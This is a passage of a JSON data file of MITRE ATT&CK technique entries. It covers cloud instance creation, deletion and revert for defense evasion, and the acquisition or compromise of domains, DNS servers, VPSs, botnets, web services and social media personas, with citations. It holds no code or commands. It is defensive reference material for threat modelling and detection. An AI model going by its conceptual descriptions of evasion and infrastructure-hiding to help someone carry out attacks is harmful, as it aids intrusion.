        "source_name": "Azure - Monitor Logs",
        "url": "https://docs.microsoft.com/en-us/azure/backup/backup-azure-monitoring-use-azuremonitor",
        "description": "Microsoft. (2019, June 4). Monitor at scale by using Azure Monitor. Retrieved May 1, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Cloud Audit Logs",
        "url": "https://cloud.google.com/logging/docs/audit#admin-activity",
        "description": "Google. (n.d.). Audit Logs. Retrieved June 1, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "GCP - Creating and Starting a VM",
        "url": "https://cloud.google.com/compute/docs/instances/create-start-instance#api_2",
        "description": "Google. (2020, April 23). Creating and Starting a VM instance. Retrieved May 1, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--cf1c2504-433f-4c4e-a1f8-91de45a0318c",
    "platform": "aws|gcp|azure",
    "tid": "T1578.002",
    "technique": "Create Cloud Instance",
    "tactic": "defense-evasion",
    "datasources": "aws-cloudtrail-logs|azure-activity-logs|gcp-audit-logs|stackdriver-logs",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>An adversary may create a new instance or virtual machine (VM) within the compute service of a cloud account to evade defenses. Creating a new instance may allow an adversary to bypass firewall rules and permissions that exist on instances currently residing within an account. An adversary may <a href=\"https://attack.mitre.org/techniques/T1578/001\">Create Snapshot</a> of one or more volumes in an account, create a new instance, mount the snapshots, and then apply a less restrictive security policy to collect <a href=\"https://attack.mitre.org/techniques/T1005\">Data from Local System</a> or for <a href=\"https://attack.mitre.org/techniques/T1074/002\">Remote Data Staging</a>.(Citation: Mandiant M-Trends 2020)<!-- raw HTML omitted --><!-- raw HTML omitted -->Creating a new instance may also allow an adversary to carry out malicious activity within an environment without affecting the execution of current running instances.</p>\n",
    "technique_references": [
      {
        "source_name": "Mandiant M-Trends 2020",
        "url": "https://content.fireeye.com/m-trends/rpt-m-trends-2020",
        "description": "Mandiant. (2020, February). M-Trends 2020. Retrieved April 24, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "AWS CloudTrail Search",
        "url": "https://aws.amazon.com/premiumsupport/knowledge-center/cloudtrail-search-api-calls/",
        "description": "Amazon. (n.d.). Search CloudTrail logs for API calls to EC2 Instances. Retrieved June 17, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Azure Activity Logs",
        "url": "https://docs.microsoft.com/en-us/azure/azure-resource-manager/management/view-activity-logs",
        "description": "Microsoft. (n.d.). View Azure activity logs. Retrieved June 17, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Cloud Audit Logs",
        "url": "https://cloud.google.com/logging/docs/audit#admin-activity",
        "description": "Google. (n.d.). Audit Logs. Retrieved June 1, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--70857657-bd0b-4695-ad3e-b13f92cac1b4",
    "platform": "aws|gcp|azure",
    "tid": "T1578.003",
    "technique": "Delete Cloud Instance",
    "tactic": "defense-evasion",
    "datasources": "aws-cloudtrail-logs|azure-activity-logs|gcp-audit-logs|stackdriver-logs",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>An adversary may delete a cloud instance after they have performed malicious activities in an attempt to evade detection and remove evidence of their presence.  Deleting an instance or virtual machine can remove valuable forensic artifacts and other evidence of suspicious behavior if the instance is not recoverable.<!-- raw HTML omitted --><!-- raw HTML omitted -->An adversary may also <a href=\"https://attack.mitre.org/techniques/T1578/002\">Create Cloud Instance</a> and later terminate the instance after achieving their objectives.(Citation: Mandiant M-Trends 2020)</p>\n",
    "technique_references": [
      {
        "source_name": "Mandiant M-Trends 2020",
        "url": "https://content.fireeye.com/m-trends/rpt-m-trends-2020",
        "description": "Mandiant. (2020, February). M-Trends 2020. Retrieved April 24, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "AWS CloudTrail Search",
        "url": "https://aws.amazon.com/premiumsupport/knowledge-center/cloudtrail-search-api-calls/",
        "description": "Amazon. (n.d.). Search CloudTrail logs for API calls to EC2 Instances. Retrieved June 17, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Azure Activity Logs",
        "url": "https://docs.microsoft.com/en-us/azure/azure-resource-manager/management/view-activity-logs",
        "description": "Microsoft. (n.d.). View Azure activity logs. Retrieved June 17, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Cloud Audit Logs",
        "url": "https://cloud.google.com/logging/docs/audit#admin-activity",
        "description": "Google. (n.d.). Audit Logs. Retrieved June 1, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--0708ae90-d0eb-4938-9a76-d0fc94f6eec1",
    "platform": "aws|gcp|azure",
    "tid": "T1578.004",
    "technique": "Revert Cloud Instance",
    "tactic": "defense-evasion",
    "datasources": "aws-cloudtrail-logs|azure-activity-logs|gcp-audit-logs|stackdriver-logs",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>An adversary may revert changes made to a cloud instance after they have performed malicious activities in attempt to evade detection and remove evidence of their presence. In highly virtualized environments, such as cloud-based infrastructure, this may be accomplished by restoring virtual machine (VM) or data storage snapshots through the cloud management dashboard or cloud APIs.<!-- raw HTML omitted --><!-- raw HTML omitted -->Another variation of this technique is to utilize temporary storage attached to the compute instance. Most cloud providers provide various types of storage including persistent, local, and/or ephemeral, with the ephemeral types often reset upon stop/restart of the VM.(Citation: Tech Republic - Restore AWS Snapshots)(Citation: Google - Restore Cloud Snapshot)</p>\n",
    "technique_references": [
      {
        "source_name": "Tech Republic - Restore AWS Snapshots",
        "url": "https://www.techrepublic.com/blog/the-enterprise-cloud/backing-up-and-restoring-snapshots-on-amazon-ec2-machines/",
        "description": "Hardiman, N.. (2012, March 20). Backing up and restoring snapshots on Amazon EC2 machines. Retrieved October 8, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Google - Restore Cloud Snapshot",
        "url": "https://cloud.google.com/compute/docs/disks/restore-and-delete-snapshots",
        "description": "Google. (2019, October 7). Restoring and deleting persistent disk snapshots. Retrieved October 8, 2019.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--40f5caa0-4cb7-4117-89fc-d421bb493df3",
    "platform": "pre",
    "tid": "T1583.001",
    "technique": "Domains",
    "tactic": "resource-development",
    "datasources": "domain-registration",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Before compromising a victim, adversaries may purchase domains that can be used during targeting. Domain names are the human readable names used to represent one or more IP addresses. They can be purchased or, in some cases, acquired for free.<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries can use purchased domains for a variety of purposes, including for <a href=\"https://attack.mitre.org/techniques/T1566\">Phishing</a>, <a href=\"https://attack.mitre.org/techniques/T1189\">Drive-by Compromise</a>, and Command and Control.(Citation: CISA MSS Sep 2020) Adversaries may choose domains that are similar to legitimate domains, including through use of homoglyphs or use of a different top-level domain (TLD).(Citation: FireEye APT28)(Citation: PaypalScam) Typosquatting may be used to aid in delivery of payloads via <a href=\"https://attack.mitre.org/techniques/T1189\">Drive-by Compromise</a>. Adversaries can also use internationalized domain names (IDNs) to create visually similar lookalike domains for use in operations.(Citation: CISA IDN ST05-016)<!-- raw HTML omitted --><!-- raw HTML omitted -->Domain registrars each maintain a publicly viewable database that displays contact information for every registered domain. Private WHOIS services display alternative information, such as their own company data, rather than the owner of the domain. Adversaries may use such private WHOIS services to obscure information about who owns a purchased domain. Adversaries may further interrupt efforts to track their infrastructure by using varied registration information and purchasing domains with different domain registrars.(Citation: Mandiant APT1)</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/630.html",
        "description": "none",
        "external_id": "CAPEC-630"
      },
      {
        "source_name": "CISA MSS Sep 2020",
        "url": "https://us-cert.cisa.gov/ncas/alerts/aa20-258a",
        "description": "CISA. (2020, September 14). Alert (AA20-258A): Chinese Ministry of State Security-Affiliated Cyber Threat Actor Activity. Retrieved October 1, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "FireEye APT28",
        "url": "https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/rpt-apt28.pdf",
        "description": "FireEye. (2015). APT28: A WINDOW INTO RUSSIA’S CYBER ESPIONAGE OPERATIONS?. Retrieved August 19, 2015.",
        "external_id": "none"
      },
      {
        "source_name": "PaypalScam",
        "url": "https://www.zdnet.com/article/paypal-alert-beware-the-paypai-scam-5000109103/",
        "description": "Bob Sullivan. (2000, July 24). PayPal alert! Beware the 'PaypaI' scam. Retrieved March 2, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "CISA IDN ST05-016",
        "url": "https://us-cert.cisa.gov/ncas/tips/ST05-016",
        "description": "CISA. (2019, September 27). Security Tip (ST05-016): Understanding Internationalized Domain Names. Retrieved October 20, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Mandiant APT1",
        "url": "https://www.fireeye.com/content/dam/fireeye-www/services/pdfs/mandiant-apt1-report.pdf",
        "description": "Mandiant. (n.d.). APT1 Exposing One of China’s Cyber Espionage Units. Retrieved July 18, 2016.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--197ef1b9-e764-46c3-b96c-23f77985dc81",
    "platform": "pre",
    "tid": "T1583.002",
    "technique": "DNS Server",
    "tactic": "resource-development",
    "datasources": "none",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Before compromising a victim, adversaries may set up their own Domain Name System (DNS) servers that can be used during targeting. During post-compromise activity, adversaries may utilize DNS traffic for various tasks, including for Command and Control (ex: <a href=\"https://attack.mitre.org/techniques/T1071\">Application Layer Protocol</a>). Instead of hijacking existing DNS servers, adversaries may opt to configure and run their own DNS servers in support of operations.<!-- raw HTML omitted --><!-- raw HTML omitted -->By running their own DNS servers, adversaries can have more control over how they administer server-side DNS C2 traffic (<a href=\"https://attack.mitre.org/techniques/T1071/004\">DNS</a>). With control over a DNS server, adversaries can configure DNS applications to provide conditional responses to malware and, generally, have more flexibility in the structure of the DNS-based C2 channel.(Citation: Unit42 DNS Mar 2019)</p>\n",
    "technique_references": [
      {
        "source_name": "Unit42 DNS Mar 2019",
        "url": "https://unit42.paloaltonetworks.com/dns-tunneling-how-dns-can-be-abused-by-malicious-actors/",
        "description": "Hinchliffe, A. (2019, March 15). DNS Tunneling: how DNS can be (ab)used by malicious actors. Retrieved October 3, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--79da0971-3147-4af6-a4f5-e8cd447cd795",
    "platform": "pre",
    "tid": "T1583.003",
    "technique": "Virtual Private Server",
    "tactic": "resource-development",
    "datasources": "none",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Before compromising a victim, adversaries may rent Virtual Private Servers (VPSs) that can be used during targeting. There exist a variety of cloud service providers that will sell virtual machines/containers as a service. By utilizing a VPS, adversaries can make it difficult to physically tie back operations to them. The use of cloud infrastructure can also make it easier for adversaries to rapidly provision, modify, and shut down their infrastructure.<!-- raw HTML omitted --><!-- raw HTML omitted -->Acquiring a VPS for use in later stages of the adversary lifecycle, such as Command and Control, can allow adversaries to benefit from the ubiquity and trust associated with higher reputation cloud service providers. Adversaries may also acquire infrastructure from VPS service providers that are known for renting VPSs with minimal registration information, allowing for more anonymous acquisitions of infrastructure.(Citation: TrendmicroHideoutsLease)</p>\n",
    "technique_references": [
      {
        "source_name": "TrendmicroHideoutsLease",
        "url": "https://documents.trendmicro.com/assets/wp/wp-criminal-hideouts-for-lease.pdf",
        "description": "Max Goncharov. (2015, July 15). Criminal Hideouts for Lease: Bulletproof Hosting Services. Retrieved March 6, 2017.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--60c4b628-4807-4b0b-bbf5-fdac8643c337",
    "platform": "pre",
    "tid": "T1583.004",
    "technique": "Server",
    "tactic": "resource-development",
    "datasources": "none",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Before compromising a victim, adversaries may buy, lease, or rent physical servers that can be used during targeting. Use of servers allows an adversary to stage, launch, and execute an operation. During post-compromise activity, adversaries may utilize servers for various tasks, including for Command and Control. Instead of compromising a third-party <a href=\"https://attack.mitre.org/techniques/T1584/004\">Server</a> or renting a <a href=\"https://attack.mitre.org/techniques/T1583/003\">Virtual Private Server</a>, adversaries may opt to configure and run their own servers in support of operations.<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may only need a lightweight setup if most of their activities will take place using online infrastructure. Or, they may need to build extensive infrastructure if they want to test, communicate, and control other aspects of their activities on their own systems.(Citation: NYTStuxnet)</p>\n",
    "technique_references": [
      {
        "source_name": "NYTStuxnet",
        "url": "https://www.nytimes.com/2011/01/16/world/middleeast/16stuxnet.html",
        "description": "William J. Broad, John Markoff, and David E. Sanger. (2011, January 15). Israeli Test on Worm Called Crucial in Iran Nuclear Delay. Retrieved March 1, 2017.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--31225cd3-cd46-4575-b287-c2c14011c074",
    "platform": "pre",
    "tid": "T1583.005",
    "technique": "Botnet",
    "tactic": "resource-development",
    "datasources": "none",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Before compromising a victim, adversaries may buy, lease, or rent a network of compromised systems that can be used during targeting. A botnet is a network of compromised systems that can be instructed to perform coordinated tasks.(Citation: Norton Botnet) Adversaries may purchase a subscription to use an existing botnet from a booter/stresser service. With a botnet at their disposal, adversaries may perform follow-on activity such as large-scale <a href=\"https://attack.mitre.org/techniques/T1566\">Phishing</a> or Distributed Denial of Service (DDoS).(Citation: Imperva DDoS for Hire)(Citation: Krebs-Anna)(Citation: Krebs-Bazaar)(Citation: Krebs-Booter)</p>\n",
    "technique_references": [
      {
        "source_name": "Norton Botnet",
        "url": "https://us.norton.com/internetsecurity-malware-what-is-a-botnet.html",
        "description": "Norton. (n.d.). What is a botnet?. Retrieved October 4, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Imperva DDoS for Hire",
        "url": "https://www.imperva.com/learn/ddos/booters-stressers-ddosers/",
        "description": "Imperva. (n.d.). Booters, Stressers and DDoSers. Retrieved October 4, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Krebs-Anna",
        "url": "https://krebsonsecurity.com/2017/01/who-is-anna-senpai-the-mirai-worm-author/",
        "description": "Brian Krebs. (2017, January 18). Who is Anna-Senpai, the Mirai Worm Author?. Retrieved May 15, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Krebs-Bazaar",
        "url": "https://krebsonsecurity.com/2016/10/hackforums-shutters-booter-service-bazaar/",
        "description": "Brian Krebs. (2016, October 31). Hackforums Shutters Booter Service Bazaar. Retrieved May 15, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Krebs-Booter",
        "url": "https://krebsonsecurity.com/2016/10/are-the-days-of-booter-services-numbered/",
        "description": "Brian Krebs. (2016, October 27). Are the Days of “Booter” Services Numbered?. Retrieved May 15, 2017.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--88d31120-5bc7-4ce3-a9c0-7cf147be8e54",
    "platform": "pre",
    "tid": "T1583.006",
    "technique": "Web Services",
    "tactic": "resource-development",
    "datasources": "none",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Before compromising a victim, adversaries may register for web services that can be used during targeting. A variety of popular websites exist for adversaries to register for a web-based service that can be abused during later stages of the adversary lifecycle, such as during Command and Control (<a href=\"https://attack.mitre.org/techniques/T1102\">Web Service</a>) or <a href=\"https://attack.mitre.org/techniques/T1567\">Exfiltration Over Web Service</a>. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. By utilizing a web service, adversaries can make it difficult to physically tie back operations to them.</p>\n",
    "technique_references": []
  },
  {
    "id": "attack-pattern--f9cc4d06-775f-4ee1-b401-4e2cc0da30ba",
    "platform": "pre",
    "tid": "T1584.001",
    "technique": "Domains",
    "tactic": "resource-development",
    "datasources": "none",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Before compromising a victim, adversaries may hijack domains and/or subdomains that can be used during targeting. Domain registration hijacking is the act of changing the registration of a domain name without the permission of the original registrant.(Citation: ICANNDomainNameHijacking) An adversary may gain access to an email account for the person listed as the owner of the domain. The adversary can then claim that they forgot their password in order to make changes to the domain registration. Other possibilities include social engineering a domain registration help desk to gain access to an account or taking advantage of renewal process gaps.<!-- raw HTML omitted --><!-- raw HTML omitted -->Subdomain hijacking can occur when organizations have DNS entries that point to non-existent or deprovisioned resources. In such cases, an adversary may take control of a subdomain to conduct operations with the benefit of the trust associated with that domain.(Citation: Microsoft Sub Takeover 2020)</p>\n",
    "technique_references": [
      {
        "source_name": "ICANNDomainNameHijacking",
        "url": "https://www.icann.org/groups/ssac/documents/sac-007-en",
        "description": "ICANN Security and Stability Advisory Committee. (2005, July 12). Domain Name Hijacking: Incidents, Threats, Risks and Remediation. Retrieved March 6, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Sub Takeover 2020",
        "url": "https://docs.microsoft.com/en-us/azure/security/fundamentals/subdomain-takeover",
        "description": "Microsoft. (2020, September 29). Prevent dangling DNS entries and avoid subdomain takeover. Retrieved October 12, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--c2f59d25-87fe-44aa-8f83-e8e59d077bf5",
    "platform": "pre",
    "tid": "T1584.002",
    "technique": "DNS Server",
    "tactic": "resource-development",
    "datasources": "none",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Before compromising a victim, adversaries may compromise third-party DNS servers that can be used during targeting. During post-compromise activity, adversaries may utilize DNS traffic for various tasks, including for Command and Control (ex: <a href=\"https://attack.mitre.org/techniques/T1071\">Application Layer Protocol</a>). Instead of setting up their own DNS servers, adversaries may compromise third-party DNS servers in support of operations.<!-- raw HTML omitted --><!-- raw HTML omitted -->By compromising DNS servers, adversaries can alter DNS records. Such control can allow for redirection of an organization’s traffic, facilitating Collection and Credential Access efforts for the adversary.(Citation: Talos DNSpionage Nov 2018)(Citation: FireEye DNS Hijack 2019) Adversaries may also be able to silently create subdomains pointed at malicious servers without tipping off the actual owner of the DNS server.(Citation: CiscoAngler)(Citation: Proofpoint Domain Shadowing)</p>\n",
    "technique_references": [
      {
        "source_name": "Talos DNSpionage Nov 2018",
        "url": "https://blog.talosintelligence.com/2018/11/dnspionage-campaign-targets-middle-east.html",
        "description": "Mercer, W., Rascagneres, P. (2018, November 27). DNSpionage Campaign Targets Middle East. Retrieved October 9, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "FireEye DNS Hijack 2019",
        "url": "https://www.fireeye.com/blog/threat-research/2019/01/global-dns-hijacking-campaign-dns-record-manipulation-at-scale.html",
        "description": "Hirani, M., Jones, S., Read, B. (2019, January 10). Global DNS Hijacking Campaign: DNS Record Manipulation at Scale. Retrieved October 9, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "CiscoAngler",
        "url": "https://blogs.cisco.com/security/talos/angler-domain-shadowing",
        "description": "Nick Biasini. (2015, March 3). Threat Spotlight: Angler Lurking in the Domain Shadows. Retrieved March 6, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Proofpoint Domain Shadowing",
        "url": "https://www.proofpoint.com/us/threat-insight/post/The-Shadow-Knows",
        "description": "Proofpoint Staff. (2015, December 15). The shadow knows: Malvertising campaigns use domain shadowing to pull in Angler EK. Retrieved October 16, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--39cc9f64-cf74-4a48-a4d8-fe98c54a02e0",
    "platform": "pre",
    "tid": "T1584.003",
    "technique": "Virtual Private Server",
    "tactic": "resource-development",
    "datasources": "none",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Before compromising a victim, adversaries may compromise third-party Virtual Private Servers (VPSs) that can be used during targeting. There exist a variety of cloud service providers that will sell virtual machines/containers as a service. Adversaries may compromise VPSs purchased by third-party entities. By compromising a VPS to use as infrastructure, adversaries can make it difficult to physically tie back operations to themselves.(Citation: NSA NCSC Turla OilRig)<!-- raw HTML omitted --><!-- raw HTML omitted -->Compromising a VPS for use in later stages of the adversary lifecycle, such as Command and Control, can allow adversaries to benefit from the ubiquity and trust associated with higher reputation cloud service providers as well as that added by the compromised third-party.</p>\n",
    "technique_references": [
      {
        "source_name": "NSA NCSC Turla OilRig",
        "url": "https://media.defense.gov/2019/Oct/18/2002197242/-1/-1/0/NSA_CSA_Turla_20191021%20ver%204%20-%20nsa.gov.pdf",
        "description": "NSA/NCSC. (2019, October 21). Cybersecurity Advisory: Turla Group Exploits Iranian APT To Expand Coverage Of Victims. Retrieved October 16, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--e196b5c5-8118-4a1c-ab8a-936586ce3db5",
    "platform": "pre",
    "tid": "T1584.004",
    "technique": "Server",
    "tactic": "resource-development",
    "datasources": "none",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Before compromising a victim, adversaries may compromise third-party servers that can be used during targeting. Use of servers allows an adversary to stage, launch, and execute an operation. During post-compromise activity, adversaries may utilize servers for various tasks, including for Command and Control. Instead of purchasing a <a href=\"https://attack.mitre.org/techniques/T1583/004\">Server</a> or <a href=\"https://attack.mitre.org/techniques/T1583/003\">Virtual Private Server</a>, adversaries may compromise third-party servers in support of operations.<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may also compromise web servers to support watering hole operations, as in <a href=\"https://attack.mitre.org/techniques/T1189\">Drive-by Compromise</a>.</p>\n",
    "technique_references": []
  },
  {
    "id": "attack-pattern--810d8072-afb6-4a56-9ee7-86379ac4a6f3",
    "platform": "pre",
    "tid": "T1584.005",
    "technique": "Botnet",
    "tactic": "resource-development",
    "datasources": "none",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Before compromising a victim, adversaries may compromise numerous third-party systems to form a botnet that can be used during targeting. A botnet is a network of compromised systems that can be instructed to perform coordinated tasks.(Citation: Norton Botnet) Instead of purchasing/renting a botnet from a booter/stresser service(Citation: Imperva DDoS for Hire), adversaries may build their own botnet by compromising numerous third-party systems. Adversaries may also conduct a takeover of an existing botnet, such as redirecting bots to adversary-controlled C2 servers.(Citation: Dell Dridex Oct 2015) With a botnet at their disposal, adversaries may perform follow-on activity such as large-scale <a href=\"https://attack.mitre.org/techniques/T1566\">Phishing</a> or Distributed Denial of Service (DDoS).</p>\n",
    "technique_references": [
      {
        "source_name": "Norton Botnet",
        "url": "https://us.norton.com/internetsecurity-malware-what-is-a-botnet.html",
        "description": "Norton. (n.d.). What is a botnet?. Retrieved October 4, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Imperva DDoS for Hire",
        "url": "https://www.imperva.com/learn/ddos/booters-stressers-ddosers/",
        "description": "Imperva. (n.d.). Booters, Stressers and DDoSers. Retrieved October 4, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Dell Dridex Oct 2015",
        "url": "https://www.secureworks.com/research/dridex-bugat-v5-botnet-takeover-operation",
        "description": "Dell SecureWorks Counter Threat Unit Threat Intelligence. (2015, October 13). Dridex (Bugat v5) Botnet Takeover Operation. Retrieved May 31, 2019.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--ae797531-3219-49a4-bccf-324ad7a4c7b2",
    "platform": "pre",
    "tid": "T1584.006",
    "technique": "Web Services",
    "tactic": "resource-development",
    "datasources": "none",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Before compromising a victim, adversaries may compromise access to third-party web services that can be used during targeting. A variety of popular websites exist for legitimate users to register for web-based services, such as GitHub, Twitter, Dropbox, Google, etc. Adversaries may try to take ownership of a legitimate user’s access to a web service and use that web service as infrastructure in support of cyber operations. Such web services can be abused during later stages of the adversary lifecycle, such as during Command and Control (<a href=\"https://attack.mitre.org/techniques/T1102\">Web Service</a>) or <a href=\"https://attack.mitre.org/techniques/T1567\">Exfiltration Over Web Service</a>.(Citation: Recorded Future Turla Infra 2020) Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. By utilizing a web service, particularly when access is stolen from legitimate users, adversaries can make it difficult to physically tie back operations to them.</p>\n",
    "technique_references": [
      {
        "source_name": "Recorded Future Turla Infra 2020",
        "url": "https://www.recordedfuture.com/turla-apt-infrastructure/",
        "description": "Insikt Group. (2020, March 12). Swallowing the Snake’s Tail: Tracking Turla Infrastructure. Retrieved October 20, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--b1ccd744-3f78-4a0e-9bb2-2002057f7928",
    "platform": "pre",
    "tid": "T1585.001",
    "technique": "Social Media Accounts",
    "tactic": "resource-development",
    "datasources": "social-media-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Before compromising a victim, adversaries may create and cultivate social media accounts that can be used during targeting. Adversaries can create social media accounts that can be used to build a persona to further operations. Persona development consists of the development of public information, presence, history and appropriate affiliations.(Citation: NEWSCASTER2014)(Citation: BlackHatRobinSage)<!-- raw HTML omitted --><!-- raw HTML omitted -->For operations incorporating social engineering, the utilization of a persona on social media may be important. These personas may be fictitious or impersonate real people. The persona may exist on a single social media site or across multiple sites (ex: Facebook, LinkedIn, Twitter, etc.). Establishing a persona  on social media may require development of additional documentation to make them seem real. This could include filling out profile information, developing social networks, or incorporating photos. <!-- raw HTML omitted --><!-- raw HTML omitted -->Once a persona has been developed an adversary can use it to create connections to targets of interest. These connections may be direct or may include trying to connect through others.(Citation: NEWSCASTER2014)(Citation: BlackHatRobinSage) These accounts may be leveraged during other phases of the adversary lifecycle, such as during Initial Access (ex: <a href=\"https://attack.mitre.org/techniques/T1566/003\">Spearphishing via Service</a>).</p>\n",
    "technique_references": [
      {
        "source_name": "NEWSCASTER2014",
        "url": "https://www.securityweek.com/iranian-hackers-targeted-us-officials-elaborate-social-media-attack-operation",
        "description": "Lennon, M. (2014, May 29). Iranian Hackers Targeted US Officials in Elaborate Social Media Attack Operation. Retrieved March 1, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "BlackHatRobinSage",
        "url": "http://media.blackhat.com/bh-us-10/whitepapers/Ryan/BlackHat-USA-2010-Ryan-Getting-In-Bed-With-Robin-Sage-v1.0.pdf",
        "description": "Ryan, T. (2010). “Getting In Bed with Robin Sage.”. Retrieved March 6, 2017.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--65013dd2-bc61-43e3-afb5-a14c4fa7437a",
    "platform": "pre",
    "tid": "T1585.002",
    "technique": "Email Accounts",
    "tactic": "resource-development",
    "datasources": "none",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
